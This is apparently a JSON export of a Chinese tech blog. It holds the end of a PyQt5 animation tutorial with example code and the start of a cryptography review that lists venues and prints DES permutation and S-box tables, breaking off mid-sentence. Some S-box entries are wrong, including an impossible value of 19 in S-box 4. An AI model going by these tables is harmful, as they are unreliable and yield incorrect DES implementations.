所有动画共享的功能，继承此类, 实现一些自定义动画\t\n\n### 循环操作\n\n- setLoopCount(int loopCount) 设置动画循环次数\n- loopCount() -> int             获取循环次数\n- currentLoop() -> int          动画的当前循环次数，从0开始\n- currentLoopTime() -> int  当前循环次数内的时间\n\n### 时间操作\n\n- duration() -> int          单次时长\n- totalDuration() -> int  动画总时长\n- currentTime() -> int    当前动画运行时长\n\n```python\nfrom PyQt5.Qt import *  # 刚开始学习可以这样一下导入\nimport sys\n\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"动画的学习\")\n        self.resize(400, 400)\n        self.set_ui()\n\n    def set_ui(self):\n        btn = QPushButton(\"按钮\", self)\n        btn.resize(200, 200)\n        btn.move(100, 100)\n        btn.setStyleSheet(\"background-color:cyan;\")\n\n        # 1, 创建一个动画对象 ，并且设置目标属性\n        animation = QPropertyAnimation(btn, b\"pos\", self)\n\n        # 2，设置属性值  包括 开始值 （插值） 结束值\n        animation.setStartValue(QPoint(0, 0))\n        animation.setKeyValueAt(0.5, QPoint(0, 200))  # 在动画时长的中间要插值\n        animation.setEndValue(QPoint(200, 200))\n\n        # 3，动画时长\n        animation.setDuration(2000)  # 2s\n\n        # 4，启动动画\n        animation.start()\n        animation.setLoopCount(3)  # 循环三遍\n\n        #时间操作\n        print(\"循环次数:\", animation.loopCount())\n        print(\"单次时长:\", animation.duration(), \"总时长:\", animation.totalDuration())\n        btn.clicked.connect(lambda: print(\"当前循环次数:\", animation.currentLoop(),\"当前循环次内的时长:\", animation.currentLoopTime(), \"当前动画运行时长:\", animation.currentTime()))\n\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n    \"\"\"\n    循环次数: 3\n    单次时长: 2000 总时长: 6000\n    当前循环次数: 0 当前循环次内的时长: 1456 当前动画运行时长: 1456\n    当前循环次数: 1 当前循环次内的时长: 1296 当前动画运行时长: 3296\n    当前循环次数: 2 当前循环次内的时长: 1328 当前动画运行时长: 5328\n    \"\"\"\n```\n\n### 动画方向\n\n- setDirection(QAbstractAnimation.Direction)\n  - 参数(QAbstractAnimation.Direction)：                          \n  - QAbstractAnimation.Forward     `0`    动画的当前时间随着时间而增加（即，从0移动到结束/持续时间）\n  - QAbstractAnimation.Backward  `1`    动画的当前时间随着时间而减少（即，从结束/持续时间向0移动）\n- direction() -> QAbstractAnimation.Direction   \n\n```python\n# 动画方向设置一定要在启动动画之前\nanimation.setDirection(QAbstractAnimation.Backward)\nprint(\"动画方向：\",animation.direction())\n```\n\n### 动画状态\n\n- state() -> QAbstractAnimation.State\n  - 参数(QAbstractAnimation.State)：\n  - QAbstractAnimation.Stopped  `0`    停止 \n  - QAbstractAnimation.Paused    `1`    暂停 \n  - QAbstractAnimation.Running  `2`    运行\n\n案例：当用户点击按钮的时候，动画停止，再次点击时动画继续。\n\n```python\nfrom PyQt5.Qt import * #刚开始学习可以这样一下导入\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"动画的学习\")\n        self.resize(400,400)\n        self.set_ui()\n\n\n    def set_ui(self):\n        btn = QPushButton(\"按钮\",self)\n        btn.resize(200,200)\n        btn.move(100,100)\n        btn.setStyleSheet(\"background-color:cyan;\")\n\n        #1, 创建一个动画对象 ，并且设置目标属性\n        animation = QPropertyAnimation(btn,b\"pos\",self)\n\n        #2，设置属性值  包括 开始值 （插值） 结束值\n        animation.setStartValue(QPoint(0,0))\n        animation.setKeyValueAt(0.5,QPoint(0,200))  #在动画时长的中间要插值\n        animation.setEndValue(QPoint(200,200))\n\n        #3，动画时长\n        animation.setDuration(2000)   #2s\n\n        #这里通过动画曲线，改变动画节奏：\n        animation.setEasingCurve(QEasingCurve.InOutBounce)\n\n        animation.setLoopCount(3)  # 循环三遍\n\n\n        #动画方向设置一定要在 启动动画之前\n        animation.setDirection(QAbstractAnimation.Backward)\n\n\n        #4，启动动画\n        animation.start()\n\n\n        def btn_clicked_slot():\n            if animation.state() == QAbstractAnimation.Running:\n                animation.pause()\n            elif animation.state() == QAbstractAnimation.Paused:\n                animation.resume()\n\n        btn.clicked.connect(btn_clicked_slot)\n\n\nif __name__ == '__main__':\n    app =QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n### 常用操作\n\n- start(QAbstractAnimation.DeletionPolicy)\n  - 参数(QAbstractAnimation.DeletionPolicy)：\n  - QAbstractAnimation.KeepWhenStopped   停止时不会删除动画。\n  - QAbstractAnimation.DeleteWhenStopped 停止时动画将自动删除。\n- pause()     动画暂停\n- stop()        动画停止\n  - stop() 和pause() 的区别：它们都可以停止运行。stop() 是不可恢复的，pause() 是可以恢复的\n\n- resume()  动画恢复\n\n- setCurrentTime(int)  设置当前时间\n- setPause(bool)  设置是否暂停\n\n### 常用信号\n\n-  currentLoopChanged(int currentLoop)   循环改变触发\n- directionChanged(QAbstractAnimation.Direction newDirection)   动画方向改变触发\n- finished()  动画完成时触发\n- stateChanged(QAbstractAnimation.State newState, QAbstractAnimation.State oldState)   动画状态改变触发（返回两个参数，新状态和老状态）\n\n##  QVariantAnimation\n\n### 设置时长\n\n- setDuration(int msecs)\n\n### 开始和结束值\n\n- setStartValue(QVariant value)\n- startValue() -> QVariant\n- setEndValue(QVariant value)\n- endValue() -> QVariant\n\n### 关键值\n\n- setKeyValueAt(double step, QVariant value)\n- keyValueAt(double step) -> QVariant\n- setKeyValues(QVariantAnimation.KeyValues keyValues)\n- keyValues() -> QVariantAnimation.KeyValues\n\n### 动画曲线\n\n- setEasingCurve(self, Union[QEasingCurve, QEasingCurve.Type])\n- easingCurve() -> Union[QEasingCurve, QEasingCurve.Type]\n- QEasingCurve取值： https://doc.qt.io/qt-5/qeasingcurve.html#Type-enum\n\n\n\n## QPropertyAnimation\n\n> 用于实现某个属性值从x到y的动画变化\n\n### 构造动画对象并设置目标属性\n\n方式1\n\n- QPropertyAnimation(parent: QObject = None)\n- setTargetObject(self, QObject)\n- targetObject(self)\n- setPropertyName(self, Union[QByteArray, bytes, bytearray])\n- propertyName(self) -> QByteArray\n\n```python\nanimation = QPropertyAnimation(self)\nanimation.setTargetObject(btn)  #对 btn 做动画\nanimation.setPropertyName(b\"pos\")  #对btn 的 pos 属性做动画\n```\n\n方式2\n\n- QPropertyAnimation(QObject, Union[QByteArray, bytes, bytearray], parent: QObject = None)\n\n```python\nanimation = QPropertyAnimation(btn, b\"pos\", self)\n```\n\n常用属性\n\n- geometry 位置和尺寸\n- pos  位置\n- size  尺寸\n- windowOpacity  透明度\n\n```python\n#对位置做动画\nanimation = QPropertyAnimation(btn,b\"pos\",self)\nanimation.setStartValue(QPoint(0,0))\nanimation.setEndValue(QPoint(300,300))\n\n#对尺寸做动画\nanimation = QPropertyAnimation(btn,b\"size\",self)\nanimation.setStartValue(QSize(0,0))\nanimation.setEndValue(QSize(300,300))\n\n#对位置和尺寸同时做动画\nanimation = QPropertyAnimation(btn,b\"geometry\",self)\nanimation.setStartValue(QRect(0,0,100,100))\nanimation.setEndValue(QRect(200,200,300,300))\n\n#对透明度做动画\nanimation = QPropertyAnimation(self,b\"windowOpacity\",self)\nanimation.setStartValue(1)\nanimation.setEndValue(0.5)\n```\n\n### 设置开始值和结束值\n\n- setStartValue(self, Any)  开始\n- setEndValue(self, Any)    结束\n- setKeyValueAt(self, float, Any)  开始和结束之间\n- setKeyValues(self, object)\n\n```python\nanimation.setStartValue(QSize(0,0))\nanimation.setKeyValueAt(0.5,QPoint(0,200))  #在动画时长的中间要插值\nanimation.setEndValue(QSize(200,200))\n```\n\n### 设置动画时长\n\n- setDuration(int mesc)\n\n```python\nanimation.setDuration(2000)   #2s\n```\n\n### 设置动画曲线\n\n- setEasingCurve(self, Union[QEasingCurve, QEasingCurve.Type])\n- QEasingCurve取值：https://doc.qt.io/qt-5/qeasingcurve.html#Type-enum\n\n```python\n#这里通过动画曲线，改变动画节奏：\nanimation.setEasingCurve(QEasingCurve.InOutBounce)\n```\n\n### 启动动画\n\n- start(QAbstractAnimation.DeletionPolicy)\n  - 参数(QAbstractAnimation.DeletionPolicy)：\n  - QAbstractAnimation.KeepWhenStopped   停止时不会删除动画。\n  - QAbstractAnimation.DeleteWhenStopped 停止时动画将自动删除。\n\n```python\n#启动动画\nanimation.start()\n```\n\n### 完整动画示例\n\n```python\nfrom PyQt5.Qt import * #刚开始学习可以这样一下导入\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"动画的学习\")\n        self.resize(400,400)\n        self.set_ui()\n\n\n    def set_ui(self):\n        btn = QPushButton(\"按钮\",self)\n        btn.resize(200,200)\n        btn.move(100,100)\n        btn.setStyleSheet(\"background-color:cyan;\")\n\n        #1, 创建一个动画对象 ，并且设置目标属性\n        animation = QPropertyAnimation(btn,b\"pos\",self)  #可一起写，对象，属性\n        # animation.setTargetObject(btn)  #对 btn 做动画\n        # animation.setPropertyName(b\"pos\")  #对btn 的 pos 属性做动画\n\n\n        #2，设置属性值  包括 开始值 （插值） 结束值\n        animation.setStartValue(QPoint(0,0))\n        animation.setKeyValueAt(0.5,QPoint(0,200))  #在动画时长的中间要插值\n        animation.setEndValue(QPoint(200,200))\n\n        #3，动画时长\n        animation.setDuration(2000)   #2s\n\n        #这里通过动画曲线，改变动画节奏：\n        animation.setEasingCurve(QEasingCurve.InOutBounce)\n\n\n        #4，启动动画\n        animation.start()\n\nif __name__ == '__main__':\n    app =QApplication(sys.argv)\n\n    window = Window()\n    window.show()\n\n    sys.exit(app.exec_())\n```\n\n## QPauseAnimation\n\n> 暂停动画, 在串行动画中使用\t\n\n- setDuration(int msecs) 设置暂停时长\n\n\n\n# 动画组\n\n## QAnimationGroup\n\n> 可以将一组动画, 同时播放或者按顺序播放\n\n添加动画\n\n- addAnimation(QAbstractAnimation animation)\n- insertAnimation(int index, QAbstractAnimation animation)\n\n移除动画\n\n- removeAnimation(QAbstractAnimation animation)\n\n获取动画\n\n- animationAt(int index) -> QAbstractAnimation\n\n获取并移除\n\n- takeAnimation(int index) -> QAbstractAnimation\n\n动画个数\n\n- animationCount() -> int\n\n清空动画\n\n- clear()\n\n## QParallelAnimationGroup\n\n> 并行动画，多个动画同时执行\n\n- 功能参照父类\n- 只是添加的所有动画, 都是同时执行\n\n## QSequentialAnimationGroup\n\n> 串行动画，多个动画先后执行\n\n- 功能参照父类\n- 只是添加的所有动画, 都是串行顺序执行\n\n- addPause(int msecs) -> QPauseAnimation    设置第一个动画执行完后暂停时间\n- insertPause(int index, int msecs) -> QPauseAnimation\n- currentAnimation() -> QAbstractAnimation\n\n- 信号：currentAnimationChanged(QAbstractAnimation current)\n\n```python\nfrom PyQt5.Qt import * #刚开始学习可以这样一下导入\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"动画组的学习\")\n        self.resize(800,800)\n        self.set_ui()\n\n    def set_ui(self):\n        red_btn = QPushButton(\"红色按钮\",self)\n        green_btn = QPushButton(\"绿色按钮\",self)\n        red_btn.resize(100,100)\n        green_btn.resize(100,100)\n        green_btn.move(150,150)\n        red_btn.setStyleSheet(\"background-color:red;\")\n        green_btn.setStyleSheet(\"background-color:green;\")\n\n        #动画设置\n        animation_green = QPropertyAnimation(green_btn,b\"pos\",self)\n        animation_green.setKeyValueAt(0,QPoint(150,150))\n        animation_green.setKeyValueAt(0.25,QPoint(550,150))\n        animation_green.setKeyValueAt(0.5,QPoint(550,550))\n        animation_green.setKeyValueAt(0.75,QPoint(150,550))\n        animation_green.setKeyValueAt(1,QPoint(150,150))\n        animation_green.setDuration(2000)\n        #animation_green.start()  # 动画不是阻塞的，动画运行时会继续往下运行\n        ###########################################################\n        animation_red = QPropertyAnimation(red_btn,b\"pos\",self)\n        animation_red.setKeyValueAt(0,QPoint(0,0))\n        animation_red.setKeyValueAt(0.25,QPoint(0,700))\n        animation_red.setKeyValueAt(0.5,QPoint(700,700))\n        animation_red.setKeyValueAt(0.75,QPoint(700,0))\n        animation_red.setKeyValueAt(1,QPoint(0,0))\n        animation_red.setDuration(2000)\n        #animation_red.start()\n\n        #用串行动画组来管理上面两个动画\n        animation_group  = QSequentialAnimationGroup(self)\n        animation_group.addAnimation(animation_red)\n        animation_group.addAnimation(animation_green)\n        animation_group.start()\n        \n        #用并行动画组来管理上面两个动画\n        # animation_group  = QParallelAnimationGroup(self)\n        # animation_group.addAnimation(animation_red)\n        # animation_group.addAnimation(animation_green)\n        # animation_group.start()\n        \n\nif __name__ == '__main__':\n    app =QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n案例：第一个动画执行执行完 5s 之后再执行第二个\n\n方法一：使用addPause\n\n```python\n#用动画组来管理上面两个动画\nanimation_group  = QSequentialAnimationGroup(self)\nanimation_group.addAnimation(animation_red)\n#############################设置暂停时长##############################\nanimation_group.addPause(5000)  # 只有串行中才会有这个设置  暂停5s\n#############################设置暂停时长##############################\nanimation_group.addAnimation(animation_green)\nanimation_group.start()\n```\n\n方法二：使用QPauseAnimation\n\n```python\n#用动画组来管理上面两个动画\nanimation_group  = QSequentialAnimationGroup(self)\nanimation_group.addAnimation(animation_red)\n#############################设置暂停时长##############################\npause_animation = QPauseAnimation()\npause_animation.setDuration(5000)\nanimation_group.addAnimation(pause_animation)\n#############################设置暂停时长##############################\nanimation_group.addAnimation(animation_green)\nanimation_group.start()\n\n```\n\n#  综合案例\n\n358\n\n注：标题后含 \"*\" 号，说明该内容还未写完，eg：“`事件*`”\n\n# 开源项目收集\n\n- [Qt-Material](https://qt-material.readthedocs.io/en/latest/index.html#qt-material)：PySide6、PySide2和PyQt5的 Material Design 风格样式表\n- [QDarkStyleSheet](https://github.com/ColinDuquesnoy/QDarkStyleSheet) ： 一个黑暗风格的样式表\n- [PyQt5_stylesheets ](https://github.com/RedFalsh/PyQt5_stylesheets)：PyQt5 风格样式表\n- [CustomWidgets](https://github.com/PyQt5/CustomWidgets)：PyQt Custom Widgets - PyQt 自定义控件 \n- [PyQt Examples](https://github.com/PyQt5/PyQt)：PyQt各种测试和例子\n- [3rd-Apps](https://github.com/PyQt5/3rd-Apps)：Collecting 3rd Apps \n\n# 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["PyQt"],"categories":["Python"]},{"title":"Cryptography Review","url":"/posts/37412.html","content":"\n初次接触密码学是在大二的<<现代密码学>>课堂上，彼时仅对理论基础进行了学习，后来参加CTF比赛，为了解答其中 Crypto 模块，将课堂学到的知识运用了起来，但总的来说研究并不深，加之近段时间没有再碰过了，故此有了写此文的想法，一是为了自己复习，二是为了此刻正在看文章的你提供一点参考。\n\n## 会议和期刊\n\n###  密码学三大顶会\n\n| 编号 | 会议简称  | 会议名称                                                     | 出版社   | 会议网址                             |\n| ---- | --------- | ------------------------------------------------------------ | -------- | ------------------------------------ |\n| 1    | Crypto    | International Cryptology Conference                          | Springer | https://iacr.org/meetings/crypto/    |\n| 2    | Eurocrypt | European Cryptology Conference                               | Springer | https://iacr.org/meetings/eurocrypt/ |\n| 3    | Asiacrypt | Annual International Conferenceon the Theory and Application of　Cryptology and Information　Security | Springer | https://iacr.org/meetings/asiacrypt/ |\n\n###  信息安全四大顶会\n\n| 编号 | 会议简称        | 会议名称                                               | 出版社             | 会议网址                              |\n| ---- | --------------- | ------------------------------------------------------ | ------------------ | ------------------------------------- |\n| 1    | CCS             | ACM Conference on Computer and Communications Security | ACM                | http://dblp.uni-trier.de/db/conf/ccs/ |\n| 2    | S&P             | IEEE Symposium on Security and Phivacy                 | IEEE               | http://dblp.uni-trier.de/db/conf/sp/  |\n| 3    | Usenix Security | Usenix Security Symposium                              | USENIX Association | http://dblp.uni-trier.de/db/conf/uss/ |\n| 4    | NDSS            | ISOC Network and Disthibuted System SecuritySyumposium | ISOC               | https://www.ndss-symposium.org/       |\n\n### 计算机类三大权威刊物\n\n| 编号 | 名称             | 主办单位                                 | 网址                                            |\n| ---- | ---------------- | ---------------------------------------- | ----------------------------------------------- |\n| 1    | 软件学报         | 中国计算机学会、中国科学院软件研究所     | [http://www.jos.org.cn](http://www.jos.org.cn/) |\n| 2    | 计算机学报       | 中国计算机学会、中国科学院计算技术研究所 | http://cjc.ict.ac.cn/                           |\n| 3    | 计算机研究与发展 | 中国计算机学会、中国科学院计算技术研究所 | http://crad.ict.ac.cn/                          |\n\n### 中国密码学会CACR推荐\n\n地址：https://www.cacrnet.org.cn/site/content/96.html\n\n#### **期刊**\n\n![](https://img.jwt1399.top/img/107A4D40-2D00-4292-9EE0-349C056EF592.png)\n\n![](https://img.jwt1399.top/img/37002D10-4240-4487-90B0-3D5A2DA627DD.png)\n\n#### 会议\n\n![](https://img.jwt1399.top/img/4D45E864-66D2-423F-8690-B13B2F5D6F91.png)\n\n![](https://img.jwt1399.top/img/EBBF92B3-65F2-43A4-B019-3FB25E1C1A41.png)\n\n###  **中国计算机学会CCF推荐**\n\n地址：https://www.ccf.org.cn/Academic_Evaluation/NIS/\n\n#### 期刊\n\n![](https://img.jwt1399.top/img/F79056AD-3386-4B39-990D-08DA15475ACC.png)\n\n#### 会议\n\n![](https://img.jwt1399.top/img/CD4E9DF0-74C9-49F6-87AA-10684F863B4F-5854961.png)\n\n![](https://img.jwt1399.top/img/96F421E8-44BF-4FB3-80C6-0C10A4F687EF.png)\n\n![](https://img.jwt1399.top/img/EF0BD344-947F-420A-B769-A7F0AD03E6FC-5855019.png)\n\n![](https://img.jwt1399.top/img/D95AEAF4-E0D7-4219-8611-5F96862CC992-5855028.png)\n\n## DES\n\n> DES 的英文全称是 Data Encryption Standard，意思是数据加密标准，DES是一个分组加密算法，加密和解密用的是同一个算法。\n\n- 典型的 DES 以 `64` 位为分组对数据加密\n\n- 密钥长 `64` 位，但实际上只有 `56` 位参与 DES 运算\n  - 第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1\n- 分组后的明文组和 56 位的密钥按位替代或交换的方法形成密文组\n\n| ![](https://img.jwt1399.top/img/202208041924050.png) |\n| :--------------------------------------------------: |\n| ![](https://img.jwt1399.top/img/202208041924427.png) |\n\nDES 算法的步骤，包括 `IP置换`、`密钥置换`、`E扩展`、`S盒代替`、`P盒置换`和`末置换`\n\n\n\n### IP置换\n\n> IP置换：将输入的 64 位数据块按位重新组合，并把输出分为 L0、R0 两部分，每部分长度为 32 位。\n\n| 58   | 50   | 42   | 34   | 26   | 18   | 10   | 2    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 60   | 52   | 44   | 36   | 28   | 20   | 12   | 4    |\n| 62   | 54   | 46   | 38   | 30   | 22   | 14   | 6    |\n| 64   | 56   | 48   | 40   | 32   | 24   | 16   | 8    |\n| 57   | 49   | 41   | 33   | 25   | 17   | 9    | 1    |\n| 59   | 51   | 43   | 35   | 27   | 19   | 11   | 3    |\n| 61   | 53   | 45   | 37   | 29   | 21   | 13   | 5    |\n| 63   | 55   | 47   | 39   | 31   | 23   | 15   | 7    |\n\n表中的数字代表新数据中此位置的数据在原数据中的位置，即**原数据块的第58位放到新数据的第1位，第50位放到第2位，……依此类推，第7位放到第64位**。置换后的数据分为 L0 和 R0 两部分，L0 为新数据的左32位，R0为新数据的右32位。\n\n注意：位数是从左边开始数的，最左边的位为1，最右边的位为 64。\n\n> 例子🌰\n\n![](https://img.jwt1399.top/img/202208041945844.png)\n\n### 密钥置换\n\n![](https://img.jwt1399.top/img/202208052020156.png)\n\n不考虑每个字节的第8位，DES的密钥由64位减至56位，每个字节的第8位作为奇偶校验位。产生的56位密钥由下表生成（注意表中没有8，16，24，32，40，48，56，64这8位）：\n\n| 57   | 49   | 41   | 33   | 25   | 17   | 9    | 1    | 58   | 50   | 42   | 34   | 26   | 18   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 10   | 2    | 59   | 51   | 43   | 35   | 27   | 19   | 11   | 3    | 60   | 52   | 44   | 36   |\n| 63   | 55   | 47   | 39   | 31   | 23   | 15   | 7    | 62   | 54   | 46   | 38   | 30   | 22   |\n| 14   | 6    | 61   | 53   | 45   | 37   | 29   | 21   | 13   | 5    | 28   | 20   | 12   | 4    |\n\n在DES的每一轮中，从56位密钥产生出不同的48位子密钥，确定这些子密钥的方式如下：\n\n　　1).将56位的密钥分成两部分，每部分28位。\n\n　　2).根据轮数，这两部分分别循环左移1位或2位。每轮移动的位数如下表：\n\n| 轮数 | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   | 13   | 14   | 15   | 16   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 位数 | 1    | 1    | 2    | 2    | 2    | 2    | 2    | 2    | 1    | 2    | 2    | 2    | 2    | 2    | 2    | 1    |\n\n移动后，从56位中选出48位。这个过程中，既置换了每位的顺序，又选择了子密钥，因此称为压缩置换。压缩置换规则如下表（注意表中没有9，18，22，25，35，38，43，54这8位）：\n\n| 14   | 17   | 11   | 24   | 1    | 5    | 3    | 28   | 15   | 6    | 21   | 10   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 23   | 19   | 12   | 4    | 26   | 8    | 16   | 7    | 27   | 20   | 13   | 2    |\n| 41   | 52   | 31   | 37   | 47   | 55   | 30   | 40   | 51   | 45   | 33   | 48   |\n| 44   | 49   | 39   | 56   | 34   | 53   | 46   | 42   | 50   | 36   | 29   | 32   |\n\n置换方法同上，此处省略。\n\n### E扩展\n\n> E扩展置换： 将 IP 置换后获得的右半部分 R0（32位）扩展为 48位 (6位×8组)，达到与密钥相同长度的数据以进行异或运算；提供更长的结果，在后续的替代运算中可以进行压缩。\n\n| `32` | 1    | 2    | 3    | 4    | `5`  |\n| ---- | ---- | ---- | ---- | ---- | ---- |\n| `4`  | 5    | 6    | 7    | 8    | `9`  |\n| `8`  | 9    | 10   | 11   | 12   | `13` |\n| `12` | 13   | 14   | 15   | 16   | `17` |\n| `16` | 17   | 18   | 19   | 20   | `21` |\n| `20` | 21   | 22   | 23   | 24   | `25` |\n| `24` | 25   | 26   | 27   | 28   | `29` |\n| `28` | 29   | 30   | 31   | 32   | `1`  |\n\n表中的数字代表位，两列橙色数据是扩展的数据，可以看出，扩展的数据是从相邻两组分别取靠近的一位，4位变为6位。靠近32位的位为1，靠近1位的位为32。表中第二行的4取自上组中的末位，9取自下组中的首位。\n\n![](https://img.jwt1399.top/img/202208041945699.png)\n\n扩展置换之后，右半部分数据R0变为 48 位，与密钥置换得到的轮密钥进行异或。\n\n> 例子🌰\n\n![](https://img.jwt1399.top/img/202208041952440.png)\n\n### S盒\n\n> 压缩后的密钥与扩展分组异或以后得到48位的数据，将这个数据送人S盒，进行替代运算。替代由8个不同的S盒完成，每个S盒有6位输入4位输出。48位输入分为8个6位的分组，一个分组对应一个S盒，对应的S盒对各组进行代替操作。\n\nS盒1\n\n| 14   | 4    | 13   | 1    | 2    | 15   | 11   | 8    | 3    | 10   | 6    | 12   | 5    | 9    | 0    | 7    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 0    | 15   | 7    | 4    | 14   | 2    | 13   | 1    | 10   | 6    | 12   | 11   | 9    | 5    | 3    | 8    |\n| 4    | 1    | 14   | 8    | 13   | 6    | 2    | 11   | 15   | 12   | 9    | 7    | 3    | 10   | 5    | 0    |\n| 15   | 12   | 8    | 2    | 4    | 9    | 1    | 7    | 5    | 11   | 3    | 14   | 10   | 0    | 6    | 13   |\n\nS盒2\n\n| 15   | 1    | 8    | 14   | 6    | 11   | 3    | 4    | 9    | 7    | 2    | 13   | 12   | 0    | 5    | 10   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 3    | 13   | 4    | 7    | 15   | 2    | 8    | 14   | 12   | 0    | 1    | 10   | 6    | 9    | 11   | 5    |\n| 0    | 14   | 7    | 11   | 10   | 4    | 13   | 1    | 5    | 8    | 12   | 6    | 9    | 3    | 2    | 15   |\n| 13   | 8    | 10   | 1    | 3    | 15   | 4    | 2    | 11   | 6    | 7    | 12   | 0    | 5    | 14   | 9    |\n\nS盒3\n\n| 10   | 0    | 9    | 14   | 6    | 3    | 15   | 5    | 1    | 13   | 12   | 7    | 11   | 4    | 2    | 8    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 13   | 7    | 0    | 9    | 3    | 4    | 6    | 10   | 2    | 8    | 5    | 14   | 12   | 11   | 15   | 1    |\n| 13   | 6    | 4    | 9    | 8    | 15   | 3    | 0    | 11   | 1    | 2    | 12   | 5    | 10   | 14   | 7    |\n| 1    | 10   | 13   | 0    | 6    | 9    | 8    | 7    | 4    | 15   | 14   | 3    | 11   | 5    | 2    | 12   |\n\nS盒4\n\n| 7    | 13   | 14   | 3    | 0    | 6    | 9    | 10   | 1    | 2    | 8    | 5    | 11   | 12   | 4    | 15   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 13   | 8    | 11   | 5    | 6    | 15   | 0    | 3    | 4    | 7    | 2    | 12   | 1    | 10   | 14   | 19   |\n| 10   | 6    | 9    | 0    | 12   | 11   | 7    | 13   | 15   | 1    | 3    | 14   | 5    | 2    | 8    | 4    |\n| 3    | 15   | 0    | 6    | 10   | 1    | 13   | 8    | 9    | 4    | 5    | 11   | 12   | 7    | 2    | 14   |\n\nS盒5\n\n| 2    | 12   | 4    | 1    | 7    | 10   | 11   | 6    | 5    | 8    | 3    | 15   | 13   | 0    | 14   | 9    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 14   | 11   | 2    | 12   | 4    | 7    | 13   | 1    | 5    | 0    | 15   | 13   | 3    | 9    | 8    | 6    |\n| 4    | 2    | 1    | 11   | 10   | 13   | 7    | 8    | 15   | 9    | 12   | 5    | 6    | 3    | 0    | 14   |\n| 11   | 8    | 12   | 7    | 1    | 14   | 2    | 13   | 6    | 15   | 0    | 9    | 10   | 4    | 5    | 3    |\n\nS盒6\n\n| 12   | 1    | 10   | 15   | 9    | 2    | 6    | 8    | 0    | 13   | 3    | 4    | 14   | 7    | 5    | 11   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 10   | 15   | 4    | 2    | 7    | 12   | 9    | 5    | 6    | 1    | 13   | 14   | 0    | 11   | 3    | 8    |\n| 9    | 14   | 15   | 5    | 2    | 8    | 12   | 3    | 7    | 0    | 4    | 10   | 1    | 13   | 11   | 6    |\n| 4    | 3    | 2    | 12   | 9    | 5    | 15   | 10   | 11   | 14   | 1    | 7    | 6    | 0    | 8    | 13   |\n\nS盒7\n\n| 4    | 11   | 2    | 14   | 15   | 0    | 8    | 13   | 3    | 12   | 9    | 7    | 5    | 10   | 6    | 1    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 13   | 0    | 11   | 7    | 4    | 9    | 1    | 10   | 14   | 3    | 5    | 12   | 2    | 15   | 8    | 6    |\n| 1    | 4    | 11   | 13   | 12   | 3    | 7    | 14   | 10   | 15   | 6    | 8    | 0    | 5    | 9    | 2    |\n| 6    | 11   | 13   | 8    | 1    | 4    | 10   | 7    | 9    | 5    | 0    | 15   | 14   | 2    | 3    | 12   |\n\nS盒8\n\n| 13   | 2    | 8    | 4    | 6    | 15   | 11   | 1    | 10   | 9    | 3    | 14   | 5    | 0    | 12   | 7    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 1    | 15   | 13   | 8    | 10   | 3    | 7    | 4    | 12   | 5    | 6    | 11   | 0    | 14   | 9    | 2    |\n| 7    | 11   | 4    | 1    | 9    | 12   | 14   | 2    | 0    | 6    | 10   | 13   | 15   | 3    | 5    | 8    |\n| 2    | 1    | 14   | 7    | 4    | 10   | 8    | 13   | 15   | 12   | 9    | 0    | 3    | 5    | 6    | 11   |\n\n### P盒\n\nS 盒输出的 32 位再经过 P 盒进行置换。\n\n| 16   | 7    | 20   | 21   | 29   | 12   | 28   | 17   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 1    | 15   | 23   | 26   | 5    | 18   | 31   | 10   |\n| 2    | 8    | 24   | 14   | 32   | 27   | 3    | 9    |\n| 19   | 13   | 30   | 6    | 22   | 11   | 4    | 25   |\n\n表中的数字代表原数据中此位置的数据在新数据中的位置，即原数据块的第16位放到新数据的第1位，第7位放到第2位，……依此类推，第25位放到第32位。\n\n### IP<sup>-1</sup>置换\n\nIP<sup>-1 </sup>置换是 IP 置换的逆过程，DES 